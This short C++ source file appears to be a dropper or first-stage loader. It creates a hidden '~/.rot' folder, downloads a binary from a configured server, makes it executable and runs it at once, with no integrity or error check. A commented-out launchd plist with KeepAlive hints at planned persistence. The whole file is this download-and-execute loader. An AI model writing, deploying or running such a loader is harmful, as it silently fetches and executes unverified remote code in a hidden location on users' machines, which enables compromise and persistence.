#include <string>
#include "../lib/http-installer.hpp"
#include "../config.h"

using namespace std;

/*const string plist = R"(
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>ca.unmined.rot</string>
    <key>ProgramArguments</key>
    <array>
        <string></string>
        <string>world</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
)";*/

auto main() -> int {
  httplib::Client cli(server_address);
  const string dirname = "/.rot";
  const string path = getenv("HOME") + dirname;
  cout << path << endl;
#ifdef _WIN32
  mkdir(path.c_str());
#else
  mkdir(path.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
#endif

  auto res = cli.Get("/content/original", [](uint64_t len, uint64_t total) {
    printf("%llu / %llu bytes => %d%% complete\n", len, total, (int) (len * 100 / total));
    return true; // return 'false' if you want to cancel the request.
  });

  cout << "Opening client file: " << path << "/client" << endl;
  ofstream test(path + "/client");
  cout << "Making file executable" << endl;
  system(("chmod +x " + path + "/client").c_str());
  cout << "Populating file...";
  test << res->body;
  test.close();
  cout << "Done!" << endl;

  cout << "Running client" << endl;
  string command = path + "/client";
  system(command.c_str());

  return EXIT_SUCCESS;
}